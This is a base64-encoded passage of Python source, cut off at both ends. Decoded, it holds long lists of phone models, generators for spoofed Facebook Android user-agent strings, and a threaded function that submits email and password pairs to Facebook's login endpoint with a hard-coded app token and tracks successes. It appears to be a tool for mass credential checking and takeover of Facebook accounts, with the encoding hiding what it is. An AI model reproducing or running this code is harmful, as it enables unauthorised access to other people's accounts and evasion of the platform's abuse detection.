IsICJYVDIxMjctOTQiLCAiWFQyMTI3LTk1IiwgIlhUMjEyNy05NiIsICJYVDIxMjctOTciLCAiWFQyMTI3LTk4IiwgIlhUMjEyNy05OSIsICJYVDIxMjctMTAwIiwgIlhUMjEyNy0xMDEiLCAiWFQyMTI3LTEwMiIsICJYVDIxMjctMTAzIiwgIlhUMjEyNy0xMDQiLCAiWFQyMTI3LTEwNSIsICJYVDIxMjctMTA2IiwgIlhUMjEyNy0xMDciLCAiWFQyMTI3LTEwOCIsICJYVDIxMjctMTA5IiwgIlhUMjEyNy0xMTAiLCAiWFQyMTI3LTExMSIsICJYVDIxMjctMTEyIiwgIlhUMjEyNy0xMTMiLCAiWFQyMTI3LTExNCIsICJYVDIxMjctMTE1IiwgIlhUMjEyNy0xMTYiLCAiWFQyMTI3LTExNyIsICJYVDIxMjctMTE4IiwgIlhUMjEyNy0xMTkiLCAiWFQyMTI3LTEyMCIsICJYVDIxMjctMTIxIiwgIlhUMjEyNy0xMjIiLCAiWFQyMTI3LTEyMyIsICJYVDIxMjctMTI0IiwgIlhUMjEyNy0xMjUiLCAiWFQyMTI3LTEyNiIsICJYVDIxMjctMTI3IiwgIlhUMjEyNy0xMjgiLCAiWFQyMTI3LTEyOSIsICJYVDIxMjctMTMwIiwgIlhUMjEyNy0xMzEiLCAiWFQyMTI3LTEzMiIsICJYVDIxMjctMTMzIiwgIlhUMjEyNy0xMzQiLCAiWFQyMTI3LTEzNSIsICJYVDIxMjctMTM2IiwgIlhUMjEyNy0xMzciLCAiWFQyMTI3LTEzOCIsICJYVDIxMjctMTM5IiwgIlhUMjEyNy0xNDAiLCAiWFQyMTI3LTE0MSIsICJYVDIxMjctMTQyIiwgIlhUMjEyNy0xNDMiLCAiWFQyMTI3LTE0NCIsICJYVDIxMjctMTQ1IiwgIlhUMjEyNy0xNDYiLCAiWFQyMTI3LTE0NyIsICJYVDIxMjctMTQ4IiwgIlhUMjEyNy0xNDkiLCAiWFQyMTI3LTE1MCIsICJYVDIxMjctMTUxIiwgIlhUMjEyNy0xNTIiLCAiWFQyMTI3LTE1MyJdLAogICAgCiAgICAibm9raWEiOiBbIk5va2lhIFgyMCIsICJOb2tpYSBYMTAiLCAiTm9raWEgRzIwIiwgIk5va2lhIEcxMCIsICJOb2tpYSA4LjMgNUciLCAiTm9raWEgNS40IiwgIk5va2lhIDMuNCIsICJOb2tpYSAyLjQiLCAiTm9raWEgOC4xIiwgIk5va2lhIDcuMiIsICJOb2tpYSA2LjIiLCAiTm9raWEgNC4yIiwgIk5va2lhIDMuMiIsICJOb2tpYSAyLjIiLCAiTm9raWEgOSBQdXJlVmlldyIsICJOb2tpYSA4IFNpcm9jY28iLCAiTm9raWEgOCIsICJOb2tpYSA3IFBsdXMiLCAiTm9raWEgNy4xIiwgIk5va2lhIDYuMSBQbHVzIiwgIk5va2lhIDYuMSIsICJOb2tpYSA1LjEgUGx1cyIsICJOb2tpYSA1LjEiLCAiTm9raWEgNC4xIiwgIk5va2lhIDMuMSBQbHVzIiwgIk5va2lhIDMuMSIsICJOb2tpYSAyLjEiLCAiTm9raWEgMSIsICJUQS0xMzM3IiwgIlRBLTEzODAiLCAiVEEtMTM5NSIsICJUQS0xMjA4IiwgIlRBLTEyMDgiLCAiVEEtMTMzNCIsICJUQS0xMzM2IiwgIlRBLTEyMzAiLCAiVEEtMTIzOSIsICJUQS0xMjgzIiwgIlRBLTEzMzUiLCAiVEEtMTIzNCIsICJUQS0xMzQ3IiwgIlRBLTEzNTMiLCAiVEEtMTM0MCIsICJUQS0xMjMzIiwgIlRBLTEzMzgiLCAiVEEtMTM4NiIsICJUQS0xMzA3IiwgIlRBLTEyOTYiLCAiVEEtMTI4MSIsICJUQS0xMzMzIiwgIlRBLTEyNDQiLCAiVEEtMTIzNSIsICJUQS0xMzU3IiwgIlRBLTEyMzYiLCAiVEEtMTMzOSIsICJUQS0xMzE2IiwgIlRBLTEzMjkiLCAiVEEtMTM0MyIsICJUQS0xMzU0IiwgIlRBLTEzMDAiLCAiVEEtMTMwMyIsICJUQS0xMjg5IiwgIlRBLTEzMTUiLCAiVEEtMTI4NyIsICJUQS0xMzQyIiwgIlRBLTEzNTEiLCAiVEEtMTMzMSIsICJUQS0xMzI1IiwgIlRBLTEyOTUiLCAiVEEtMTI0MCIsICJUQS0xMjg2IiwgIlRBLTEzMjgiLCAiVEEtMTI4NCIsICJUQS0xMjkzIiwgIlRBLTEzNDEiLCAiVEEtMTI5MiIsICJUQS0xMzI3IiwgIlRBLTEyOTgiLCAiVEEtMTMyMyIsICJUQS0xMjM4IiwgIlRBLTEyOTEiLCAiVEEtMTM0NSIsICJUQS0xMzA5IiwgIlRBLTEzNDQiLCAiVEEtMTMyNCIsICJUQS0xMzQ2IiwgIlRBLTEzMjYiLCAiVEEtMTMwNCIsICJUQS0xMzIwIiwgIlRBLTEzNDgiLCAiVEEtMTMxOCIsICJUQS0xMzMwIiwgIlRBLTEyODAiLCAiVEEtMTI0NiIsICJUQS0xMjQ4IiwgIlRBLTEzMTciLCAiVEEtMTI5OSIsICJUQS0xMzEwIiwgIlRBLTEzNTAiLCAiVEEtMTMzMiIsICJUQS0xMjQyIiwgIlRBLTEyMDYiLCAiVEEtMTI5NCIsICJUQS0xMzEzIiwgIlRBLTEyNDkiLCAiVEEtMTI0MSIsICJUQS0xMjE2IiwgIlRBLTEyOTciLCAiVEEtMTI4NSIsICJUQS0xMzE5IiwgIlRBLTEyNDMiLCAiVEEtMTM1NiJdLAogICAgCiAgICAieGlhb21pIjogWyJNaSAxMSIsICJNaSAxMCBQcm8iLCAiTWkgOVQiLCJNMjEwMUs3QUciLCJNMjAwM0oxNVNDIiwiTTIwMDRKMTlDIiwiTTIwMDZDM0xHIiwiTTIwMDdKMjBDRyIsIk0yMDEwSjE5Q0ciLCJNMjAxMUsyQyIsIk0yMDEySzExQUciLCJNMjEwMUs3QkciLCJNMjEwMUs5RyIsIk0yMTAySjIwU0ciLCJNMjEwMksxRyIsIk0yMDEySzExQyIsIlJlZG1pIDZBIiwiTTIwMDNKMTVTQyIsIk1JIE1BWCAyIiwiQVQmYW1wO2FtcC1UIiwiUmVkbWkgTm90ZSA0IiwiUmVkbWkgTm90ZSA1IiwgIlJlZG1pIDRYIiwiUmVkbWkgTm90ZSA4IiwiUmVkbWkgTm90ZSA4IFBybyIsIlhpYW9taSBNaSAxMSBVbHRyYSIsICJYaWFvbWkgTWkgMTEgUHJvIiwgIlhpYW9taSBNaSAxMSIsICJYaWFvbWkgTWkgMTAgVWx0cmEiLCAiWGlhb21pIE1pIDEwIFBybyIsICJYaWFvbWkgTWkgMTAiLCAiWGlhb21pIE1pIDEwVCBQcm8iLCAiWGlhb21pIE1pIDEwVCIsICJYaWFvbWkgTWkgOVQgUHJvIiwgIlhpYW9taSBNaSA5VCIsICJYaWFvbWkgTWkgOSBQcm8gNUciLCAiWGlhb21pIE1pIDkiLCAiWGlhb21pIE1pIDggUHJvIiwgIlhpYW9taSBNaSA4IiwgIlhpYW9taSBNaSA4IExpdGUiLCAiWGlhb21pIE1pIDggU0UiLCAiWGlhb21pIE1pIE1peCAzIiwgIlhpYW9taSBNaSBNaXggMlMiLCAiWGlhb21pIE1pIE1peCAyIiwgIlhpYW9taSBNaSBNaXgiLCAiWGlhb21pIFJlZG1pIE5vdGUgMTEgUHJvKyIsICJYaWFvbWkgUmVkbWkgTm90ZSAxMSBQcm8iLCAiWGlhb21pIFJlZG1pIE5vdGUgMTEiLCAiWGlhb21pIFJlZG1pIE5vdGUgMTAgUHJvIiwgIlhpYW9taSBSZWRtaSBOb3RlIDEwIiwgIlhpYW9taSBSZWRtaSBOb3RlIDkgUHJvIiwgIlhpYW9taSBSZWRtaSBOb3RlIDkiLCAiWGlhb21pIFJlZG1pIE5vdGUgOCBQcm8iLCAiWGlhb21pIFJlZG1pIE5vdGUgOCIsICJYaWFvbWkgUmVkbWkgTm90ZSA3IFBybyIsICJYaWFvbWkgUmVkbWkgTm90ZSA3IiwgIlhpYW9taSBSZWRtaSBLNDAgUHJvIiwgIlhpYW9taSBSZWRtaSBLNDAiLCAiWGlhb21pIFJlZG1pIEszMCBQcm8iLCAiWGlhb21pIFJlZG1pIEszMCIsICJYaWFvbWkgUmVkbWkgSzIwIFBybyIsICJYaWFvbWkgUmVkbWkgSzIwIiwgIlhpYW9taSBQb2NvIFgzIFBybyIsICJYaWFvbWkgUG9jbyBYMyIsICJYaWFvbWkgUG9jbyBYMiIsICJYaWFvbWkgUG9jbyBGMyIsICJYaWFvbWkgUG9jbyBGMiBQcm8iLCAiWGlhb21pIFBvY28gRjEiXSwKICAgIAogICAgInNhbXN1bmciOiBbIkdhbGF4eSBTMjEiLCAiR2FsYXh5IEE1MiIsICJHYWxheHkgUzIwIiwiU00tQTUwMEYiLCJTTS1BNTAwRlUiLCJTTS1BNTAwSCIsIlNNLUc1MzJGIiwiU00tRzkwMEYiLCJTTS1HOTIwRiIsIlNNLUc5MzBGIiwiU00tRzkzNUYiLCJTTS1HOTUwRiIsIlNNLUozMjBGIiwiU00tSjMyMEZOIiwiU00tSjMyMEgiLCJTTS1KMzIwTSIsIlNNLUo1MTBGTiIsIlNNLUo3MDFGIiwiU00tTjkyMFMiLCJTTS1UMTExIiwiU00tVDIzMCIsIlNNLVQyMzEiLCJTTS1UMjM1IiwiU00tVDI4MCIsIlNNLVQzMTEiLCJTTS1UMzE1IiwiU00tVDUyNSIsIlNNLVQ1MzEiLCJTTS1UNTM1IiwiU00tVDU1NSIsIlNNLVQ1NjEiLCJTTS1UNzA1IiwiU00tVDgwNSIsIlNNLVQ4MjAiLCJTUEgtTDcyMCIsIlNNLVM5MDZFIiwgIlNhbXN1bmcgR2FsYXh5IFMyMSBVbHRyYSIsICJTYW1zdW5nIEdhbGF4eSBTMjErIiwgIlNhbXN1bmcgR2FsYXh5IFMyMSIsICJTYW1zdW5nIEdhbGF4eSBOb3RlIDIwIFVsdHJhIiwgIlNhbXN1bmcgR2FsYXh5IE5vdGUgMjAiLCAiU2Ftc3VuZyBHYWxheHkgUzIwIFVsdHJhIiwgIlNhbXN1bmcgR2FsYXh5IFMyMCsiLCAiU2Ftc3VuZyBHYWxheHkgUzIwIiwgIlNhbXN1bmcgR2FsYXh5IE5vdGUgMTArIiwgIlNhbXN1bmcgR2FsYXh5IE5vdGUgMTAiLCAiU2Ftc3VuZyBHYWxheHkgUzEwKyIsICJTYW1zdW5nIEdhbGF4eSBTMTAiLCAiU2Ftc3VuZyBHYWxheHkgTm90ZSA5IiwgIlNhbXN1bmcgR2FsYXh5IFM5KyIsICJTYW1zdW5nIEdhbGF4eSBTOSIsICJTYW1zdW5nIEdhbGF4eSBOb3RlIDgiLCAiU2Ftc3VuZyBHYWxheHkgUzgrIiwgIlNhbXN1bmcgR2FsYXh5IFM4IiwgIlNhbXN1bmcgR2FsYXh5IE5vdGUgNyIsICJTYW1zdW5nIEdhbGF4eSBTNyBFZGdlIiwgIlNhbXN1bmcgR2FsYXh5IFM3IiwgIlNhbXN1bmcgR2FsYXh5IE5vdGUgNSIsICJTYW1zdW5nIEdhbGF4eSBTNiBFZGdlKyIsICJTYW1zdW5nIEdhbGF4eSBTNiBFZGdlIiwgIlNhbXN1bmcgR2FsYXh5IFM2IiwgIlNhbXN1bmcgR2FsYXh5IE5vdGUgNCIsICJTYW1zdW5nIEdhbGF4eSBTNSIsICJTYW1zdW5nIEdhbGF4eSBTNCIsICJTYW1zdW5nIEdhbGF4eSBTMyIsICJTYW1zdW5nIEdhbGF4eSBOb3RlIDMiLCAiU00tRzk5MSIsICJTTS1HOTgxIiwgIlNNLUc5NzMiLCAiU00tRzk2MCIsICJTTS1HOTUwIiwgIlNNLUc5MzAiLCAiU00tRzkyMCIsICJTTS1HOTAwIiwgIkdULUk5NTAwIiwgIkdULUk5MzAwIiwgIkdULUk5MTAwIiwgIkdULUk5MDAwIiwgIlNNLU45ODEiLCAiU00tTjk3MCIsICJTTS1OOTYwIiwgIlNNLU45NTAiLCAiU00tTjkyMCIsICJTTS1OOTEwIiwgIlNNLU45MDAiLCAiR1QtTjcxMDAiLCAiR1QtTjcwMDAiLCAiU00tRzk5MSIsICJTTS1HOTgxIiwgIlNNLUc5NzMiLCAiU00tRzk2MCIsICJTTS1HOTUwIiwgIlNNLUc5MzAiLCAiU00tRzkyMCIsICJTTS1HOTAwIiwgIkdULUk5NTAwIiwgIkdULUk5MzAwIiwgIkdULUk5MTAwIiwgIkdULUk5MDAwIiwgIlNNLU45ODEiLCAiU00tTjk3MCIsICJTTS1OOTYwIiwgIlNNLU45NTAiLCAiU00tTjkyMCIsICJTTS1OOTEwIiwgIlNNLU45MDAiLCAiR1QtTjcxMDAiLCAiR1QtTjcwMDAiLCAiU00tQTUyNkIiLCAiU00tQTUxNkIiLCAiU00tQTUxNk4iLCAiU00tQTUyNlUiLCAiU00tQTcxNlUiLCAiU00tQTcxNlYiLCAiU00tQTUyNjAiLCAiU00tQTUyNlciLCAiU00tQTEyNlUiLCAiU00tQTEyNlYiLCAiU00tQTAxNkciLCAiU00tQTAxNkIiLCAiU00tQTAxNk0iLCAiU00tQTAyNU0iLCAiU00tQTAyNUYiLCAiU00tQTIxN0YiLCAiU00tQTIxN00iLCAiU00tQTIwN0YiLCAiU00tQTIwN00iLCAiU00tQTEwMlUiLCAiU00tQTEwMlUxIiwgIlNNLUExMDJXIiwgIlNNLUExMDJOIiwgIlNNLUExMDIwIiwgIlNNLUExMDVGIiwgIlNNLUExMDVHIiwgIlNNLUExMDVNIiwgIlNNLUEyMDJGIiwgIlNNLUEyMDJHIiwgIlNNLUEyMDJNIiwgIlNNLUExMjVVIiwgIlNNLUExMjVWIiwgIlNNLUEwMjJHIiwgIlNNLUEwMjJNIiwgIlNNLUEwMjdHIiwgIlNNLUEwMjdNIiwgIlNNLUEyMTcwIiwgIlNNLUExMTVNIiwgIlNNLUExMDdNIiwgIlNNLUExMDdGIiwgIlNNLUExMDdNIiwgIlNNLUEwMjIwIiwgIlNNLUExMTVGIiwgIlNNLUExMDJGIiwgIlNNLUExMDUwIl0sCiAgICAKICAgICJ2aXZvIjogWyJWaXZvX1g2MF9Qcm8iLCAiVml2b19YNTBfUHJvIiwgIlZpdm9fWDMwX1BybyIsICJWaXZvX1gyNyIsICJWaXZvX1gyMyIsICJWaXZvX1gyMSIsICJWaXZvX1YyMSIsICJWaXZvX1YxNyIsICJWaXZvX1YxNSIsICJWaXZvX1YxMSIsICJWaXZvX1Y5IiwgIlZpdm9fWTk1IiwgIlZpdm9fWTkxIiwgIlZpdm9fWTgxIiwgIlZpdm9fWTcxIiwgIlZpdm9fUzEiLCAiVjIwNTYiLCAiVjIxMTJBIiwgIlYyMTEyIiwgIlYyMTIyQSIsICJWMjEyMEEiLCAiVjIxMjAiLCAiVjIxMTZBIiwgIlYyMTE0QSIsICJWMjExMkEiLCAiVjIwMTBBIiwgIlYyMDE5QSIsICJWMjAxMCIsICJWMjAwM0EiLCAiVjIwMDJBIiwgIlYyMDAyIiwgIlYxOTMyQSIsICJWMTkzMlQiLCAiVjE5MzIiLCAiVjE5MjlBIiwgIlYxOTI4QSIsICJWMTkyOFQiLCAiVjE5MjgiLCAiVjE5MjdBIiwgIlYxOTI2QSIsICJWMTkyNUEiLCAiVjE5MjUiLCAiVjE5MjRBIiwgIlYxOTIyQSIsICJWMTkyMUEiLCAiVjE5MjEiLCAiVjE5MjBBIiwgIlYxOTE5QSIsICJWMTkxNkEiLCAiVjE5MTYiLCAiVjE5MTJBIiwgIlYxOTExQSIsICJWMTkxMEEiLCAiVjE5MTAiLCAiVjE5MDlBIiwgIlYxOTA3QSIsICJWMTkwNSIsICJWMTkwM0EiLCAiVjE5MDFBIiwgIlYxOTAxVCIsICJWMTkwMSIsICJWMTgzNiIsICJWMTgyNEEiLCAiVjE4MjRUIiwgIlYxODI0IiwgIlYxODE4QSIsICJWMTgxOFQiLCAiVjE4MTNBIiwgIlYxODEzVCIsICJWMTgxMyIsICJWMTgxMkEiLCAiVjE4MTFBIiwgIlYxODExVCIsICJWMTgxMSIsICJWMTgwOEEiLCAiVjE4MDhUIiwgIlYxODA4IiwgIlYxODAxQSIsICJWMTgwMVQiLCAiVjE4MDEiLCAiVjE3MzBUIiwgIlYxNzMwRiIsICJWMTczMEEiLCAiVjE3MzAiLCAiVjE3MjRBIiwgIlYxNzIzQSIsICJWMTcyMyIsICJWMTcyMUEiLCAiVjE3MjBBIiwgIlYxNzIwVCIsICJWMTcyMCIsICJWMTcxNkEiLCAiVjE3MTVBIiwgIlYxNzE1IiwgIlYxNzEzQSIsICJWMTcxMyIsICJWMTcxMkEiLCAiVjE3MTIiLCAiVjE3MTFUIiwgIlYxNzExQSIsICJWMTcxMSIsICJWMTcwOUEiLCAiVjE3MDlUIiwgIlYxNzA5IiwgIlYxNzA4QSIsICJWMTcwOFQiLCAiVjE3MDdBIiwgIlYxNzA3VCIsICJWMTcwNlQiLCAiVjE3MDYiLCAiVjE3MDNBIiwgIlYxNzAxQSIsICJWMTcwMSIsICJWMTYyNEEiLCAiVjE2MjNBIiwgIlYxNjIyQSIsICJWMTYyMiIsICJWMTYyMUEiLCAiVjE2MTkiLCAiVjE2MThBIiwgIlYxNjE3QSIsICJWMTYxNiIsICJWMTYxNVQiLCAiVjE2MTRUIiwgIlYxNjEzIiwgIlYxNjExVCIsICJWMTYxMSIsICJWMTYwOEEiLCAiVjE2MDkiLCAiVjE2MDUiLCAiVjE2MDQiLCAiVjE2MDMiLCAiVjE2MDEiLCAiVjE1NzAiLCAiVjE1NjIiLCAiVjE1NjEiLCAiVjE1NTAiLCAiVjE1NDgiLCAiVjE1NDYiLCAiVjE1NDMiLCAiVjE1NDIiLCAiVjE1NDAiLCAiVjE1MzAiLCAiVjE1MjAiLCAiVjE1MTAiLCAiVjE1MDAiLCAiVjE0MjAiLCAiVjE0MDAiLCAiVjEzMTAiLCAiVjEzMjAiXSwKICAgIAogICAgInp0ZSI6IFsiWlRFX0F4b25fMTBfUHJvIiwgIlpURV9BeG9uXzkiLCAiWlRFX0F4b25fNyIsICJaVEVfQXhvbl83X01pbmkiLCAiWlRFX0JsYWRlXzIwIiwgIlpURV9CbGFkZV8xMCIsICJaVEVfQmxhZGVfVjEwIiwgIlpURV9CbGFkZV9WOSIsICJaVEVfQmxhZGVfWCIsICJaVEVfQmxhZGVfQTciLCAiWlRFX051YmlhX1JlZF9NYWdpYyIsICJaVEVfTnViaWFfWjIwIiwgIlpURV9OdWJpYV9YIiwgIlpURV9OdWJpYV9aMTgiLCAiWlRFX051YmlhX1oxNyIsIkF4b25fMTBfUHJvIiwgIkF4b25fOSIsICJBeG9uXzciLCAiQXhvbl83X01pbmkiLCAiQmxhZGVfMjAiLCAiQmxhZGVfMTAiLCAiQmxhZGVfVjEwIiwgIkJsYWRlX1Y5IiwgIkJsYWRlX1giLCAiQmxhZGVfQTciLCAiTnViaWFfUmVkX01hZ2ljIiwgIk51YmlhX1oyMCIsICJOdWJpYV9YIiwgIk51YmlhX1oxOCIsICJOdWJpYV9aMTciXSwKICAgIAogICAgImxnIjogWyJMR19HOCIsICJMR19WNTAiLCAiTEdfVjQwIiwgIkxHX0c3IiwgIkxHX1YzMCIsICJMR19HNiIsICJMR19WMjAiLCAiTEdfRzUiLCAiTEdfVjEwIiwgIkxHX0c0IiwgIkxHX0czIiwgIkxHX0cyIiwgIkxHX0dfRmxleCJdLAogICAgCiAgICAiaHVhd2VpIjogWyJIdWF3ZWlfUDQwIiwgIkh1YXdlaV9QMzAiLCAiSHVhd2VpX1AyMCIsICJIdWF3ZWlfTWF0ZV8zMCIsICJIdWF3ZWlfTWF0ZV8yMCIsICJIdWF3ZWlfTWF0ZV8xMCIsICJIdWF3ZWlfTm92YV81IiwgIkh1YXdlaV9Ob3ZhXzQiLCAiSHVhd2VpX05vdmFfMyIsICJIdWF3ZWlfUDEwIiwgIkh1YXdlaV9QOSIsICJIdWF3ZWlfSG9ub3JfOSIsICJIdWF3ZWlfSG9ub3JfOCIsICJIdWF3ZWlfWTkiLCAiSHVhd2VpX1k4Il0sCiAgICAKICAgICJvbmVwbHVzIjogWyJPbmVQbHVzXzlfUHJvIiwgIk9uZVBsdXNfOSIsICJPbmVQbHVzXzhUIiwgIk9uZVBsdXNfOF9Qcm8iLCAiT25lUGx1c184IiwgIk9uZVBsdXNfN1RfUHJvIiwgIk9uZVBsdXNfN1QiLCAiT25lUGx1c183X1BybyIsICJPbmVQbHVzXzciLCAiT25lUGx1c182VCIsICJPbmVQbHVzXzYiLCAiT25lUGx1c181VCIsICJPbmVQbHVzXzUiLCAiT25lUGx1c18zVCIsICJPbmVQbHVzXzMiXX0KCgoKCiAgICBmYmNyID0gcmFuZG9tLmNob2ljZShmYmNyX3ZhbHVlcykKICAgIAogICAgZmJtZiA9IHJhbmRvbS5jaG9pY2UobGlzdChmYm1mX2ZiZHZfZGljdC5rZXlzKCkpKQogICAgZmJkdiA9IHJhbmRvbS5jaG9pY2UoZmJtZl9mYmR2X2RpY3RbZmJtZl0pCiAgICAKICAgIGNvbG9yID0gcmFuZG9tLmNob2ljZShbJ1wwMzNbOTFtJywnXDAzM1s5Mm0nLCdcMDMzWzkzbScsJ1wwMzNbOTRtJywnXDAzM1s5NW0nLCdcMDMzWzk2bScsJ1wwMzNbOTdtJ10pCgogICAgdXNlcl9hZ2VudCA9IGYiW0ZCQU4vRkI0QTtGQkFWLyIrc3RyKHJhbmRvbS5yYW5kaW50KDE5OSwzOTkpKSsiLjAuMC4iK3N0cihyYW5kb20ucmFuZGludCgxLDkpKSsiLiIrc3RyKHJhbmRvbS5yYW5kaW50KDk5LDE5OSkpKyI7RkJCVi8iK3N0cihyYW5kb20ucmFuZGludCgxMTExMTExMTEsOTk5OTk5OTk5KSkrIjtGQkRNL3tkZW5zaXR5PSIrc3RyKHJhbmRvbS5yYW5kaW50KDIsMykpKyIuIitzdHIocmFuZG9tLnJhbmRpbnQoMCw1KSkrIix3aWR0aD0xMDgwLGhlaWdodD0iK3N0cihyYW5kb20ucmFuZGludCgxNDAwLDE0OTkpKSsifTtGQkxDL2VuX1VTO0ZCUlYvIitzdHIocmFuZG9tLnJhbmRpbnQoMTk5LDM5OSkpKyIuMC4wLiIrc3RyKHJhbmRvbS5yYW5kaW50KDEsOSkpKyIuIitzdHIocmFuZG9tLnJhbmRpbnQoOTksMTk5KSkrIjtGQkNSLyIrZmJjcisiO0ZCTUYvIitmYm1mKyI7RkJCRC8iK2ZibWYrIjtGQlBOL2NvbS5mYWNlYm9vay5rYXRhbmE7RkJEVi8iK2ZiZHYrIjtGQlNWLyIrc3RyKHJhbmRvbS5yYW5kaW50KDksMTIpKSsiO0ZCT1AvMTtGQkNBL2FybTY0LXY4YTpdIgogICAgcmV0dXJuIHVzZXJfYWdlbnQKCgogICAgCgoKCmltcG9ydCByYW5kb20KaW1wb3J0IHN0cmluZwoKZGVmIGdlbmVyYXRlX3VzZXJfYWdlbnQoKToKICAgIGZiYXYgPSBmIntyYW5kb20ucmFuZGludCgxMTEsIDk5OSl9LjAuMC57cmFuZG9tLnJhbmRpbnQoMTEsIDk5KX0ue3JhbmRvbS5yYW5kaW50KDExMSwgOTk5KX0iCiAgICBmYmJ2ID0gc3RyKHJhbmRvbS5yYW5kaW50KDExMTExMTExMSwgOTk5OTk5OTk5KSkKICAgIGZicnYgPSAnMCcKICAgIHJhbmRvbV9zZWVkID0gcmFuZG9tLlJhbmRvbSgpCiAgICBhZGlkID0gJycuam9pbihyYW5kb21fc2VlZC5jaG9pY2VzKHN0cmluZy5oZXhkaWdpdHMsIGs9MTYpKQoKICAgICMgUmFuZG9tbHkgdmFyeSB0aGUgQW5kcm9pZCBPUyB2ZXJzaW9uLCBkZXZpY2UsIGFuZCBhcHAgdmVyc2lvbiBmb3IgcmVhbGlzbQogICAgZGV2aWNlID0gcmFuZG9tLmNob2ljZShbIkhVQVdFSSBNQVItTFgxTSIsICJTYW1zdW5nIFNNLUc5NjBGIiwgIk9uZVBsdXMgR00xOTEzIl0pCiAgICBmYmF2X3ZlcnNpb24gPSBzdHIocmFuZG9tLnJhbmRpbnQoNDksIDE1MCkpICAjIFVwZGF0ZWQgcmFuZ2UgZm9yIEZCQVYgdmVyc2lvbnMKICAgIGZiYnZfdmVyc2lvbiA9IHN0cihyYW5kb20ucmFuZGludCgxMTExMTExMSwgNzc3Nzc3NzcpKQogICAgY2FycmllciA9IHJhbmRvbS5jaG9pY2UoWyJPb3JlZG9vIFROIiwgIk9yYW5nZSIsICJWb2RhZm9uZSIsICJULU1vYmlsZSJdKQoKICAgIHVhX2JncmFwaCA9IGYnW0ZCQU4vRkI0QTtGQkFWL3tmYmF2X3ZlcnNpb259LjAuMC57cmFuZG9tLnJhbmRyYW5nZSgyMCwgNDkpfS57cmFuZG9tLnJhbmRpbnQoMTEsIDk5KX07RkJCVi97ZmJidl92ZXJzaW9ufTsnIFwKICAgICAgICAgICAgICAgIGYnW0ZCQU4vRkI0QTtGQkFWL3tmYmF2fTtGQkJWL3tmYmJ2fTtGQkRNL3t7ZGVuc2l0eT0zLjAsd2lkdGg9MTA4MCxoZWlnaHQ9MjEwN319O0ZCTEMvZnJfRlI7JyBcCiAgICAgICAgICAgICAgICBmJ0ZCUlYve2ZicnZ9O0ZCQ1Ive2NhcnJpZXJ9O0ZCTUYve2RldmljZS5zcGxpdCgiICIpWzBdfTtGQkJEL3tkZXZpY2Uuc3BsaXQoIiAiKVswXX07JyBcCiAgICAgICAgICAgICAgICBmJ0ZCUE4vY29tLmZhY2Vib29rLmthdGFuYTtGQkRWL3tkZXZpY2V9O0ZCU1YvOTtGQk9QLzE7RkJDQS9hcm02NC12OGE6XScKICAgIAogICAgcmV0dXJuIHVhX2JncmFwaAoKdWFfYmdyYXBoID0gZ2VuZXJhdGVfdXNlcl9hZ2VudCgpCgoKaW1wb3J0IHJlcXVlc3RzCmltcG9ydCByYW5kb20KaW1wb3J0IGNvbmN1cnJlbnQuZnV0dXJlcyBhcyB0aHJlYWQKaW1wb3J0IG9zCmltcG9ydCBzdHJpbmcKCiMgUmFuZG9tIEZCIHZlcnNpb24gZ2VuZXJhdGlvbgpmYmF2ID0gZid7cmFuZG9tLnJhbmRpbnQoMTExLCA5OTkpfS4wLjAue3JhbmRvbS5yYW5kaW50KDExLCA5OSl9LntyYW5kb20ucmFuZGludCgxMTEsIDk5OSl9JwpmYmJ2ID0gc3RyKHJhbmRvbS5yYW5kaW50KDExMTExMTExMSwgOTk5OTk5OTk5KSkKZmJydiA9ICcwJwpyYW5kb21fc2VlZCA9IHJhbmRvbS5SYW5kb20oKQphZGlkID0gJycuam9pbihyYW5kb21fc2VlZC5jaG9pY2VzKHN0cmluZy5oZXhkaWdpdHMsIGs9MTYpKQoKIyBVc2VyIGFnZW50IHN0cmluZwp1YV9iZ3JhcGggPSAnW0ZCQU4vRkI0QTtGQkFWLycgKyBzdHIocmFuZG9tLnJhbmRpbnQoNDksIDY2KSkgKyAnLjAuMC4nICsgc3RyKHJhbmRvbS5yYW5kcmFuZ2UoMjAsIDQ5KSkgKyBzdHIocmFuZG9tLnJhbmRpbnQoMTEsIDk5KSkgKyAnO0ZCQlYvJyArIHN0cihyYW5kb20ucmFuZGludCgxMTExMTExMSwgNzc3Nzc3NzcpKSArICc7JyArICdbRkJBTi9GQjRBO0ZCQVYvJyArIGZiYXYgKyAnO0ZCQlYvJyArIGZiYnYgKyAnO0ZCRE0ve2RlbnNpdHk9My4wLHdpZHRoPTEwODAsaGVpZ2h0PTIxMDd9O0ZCTEMvZnJfRlI7RkJSVi8nICsgZmJydiArICc7RkJDUi9Pb3JlZG9vIFROO0ZCTUYvSFVBV0VJO0ZCQkQvSFVBV0VJO0ZCUE4vY29tLmZhY2Vib29rLmthdGFuYTtGQkRWL01BUi1MWDFNO0ZCU1YvOTtGQk9QLzE7RkJDQS9hcm02NC12OGE6XScKCmRlZiBiZ3JhcGgodWlkLCBwdywgcGF0aF9maWxlLCBleHRyYWN0X3R5cGUsIHN1Y2Nlc3NfY291bnQsIGV4aXN0aW5nX3VpZHMpOgogICAgYWNjZXNzVG9rZW4gPSAnMzUwNjg1NTMxNzI4fDYyZjhjZTlmNzRiMTJmODRjMTIzY2MyMzQzN2E0YTMyJyAgIyBFeGFtcGxlIHRva2VuCgogICAgZGF0YSA9IHsKICAgICAgICAnbWV0aG9kJzogJ2F1dGgubG9naW4nLAogICAgICAgICdmYl9hcGlfcmVxX2ZyaWVuZGx5X25hbWUnOiAnYXV0aGVudGljYXRlJywKICAgICAgICAnZmJfYXBpX2NhbGxlcl9jbGFzcyc6ICdjb20uZmFjZWJvb2suYWNjb3VudC5sb2dpbi5wcm90b2NvbC5GYjRhQXV0aEhhbmRsZXInLAogICAgICAgICdhcGlfa2V5JzogJzYyZjhjZTlmNzRiMTJmODRjMTIzY2MyMzQzN2E0YTMyJywKICAgICAgICAnZW1haWwnOiB1aWQsCiAgICAgICAgJ3Bhc3N3b3JkJzogcHcsCiAgICAgICAgJ2FjY2Vzc190b2tlbic6IGFjY2Vzc1Rva2VuCiAgICB9CgogICAgdXJsID0gJ2h0dHBzOi8vYi1ncmFwaC5mYWNlYm9vay5jb20vYXV0aC9sb2dpbj9pbmNsdWRlX2hlYWRlcnM9ZmFsc2UmZGVjb2RlX2JvZHlfanNvbj1mYWxzZSZzdHJlYW1hYmxlX2pzb25fcmVzcG9uc2U9dHJ1ZScKCiAgICB0cnk6CiAgICAgICAgCiAgICAgICAgaWYgdWlkIGluIGV4aXN0aW5nX3VpZHM6CiAgICAgICAgICAgIHByaW50KGYiICAgICB7eWVsbG93fVtJTkZPXSB7c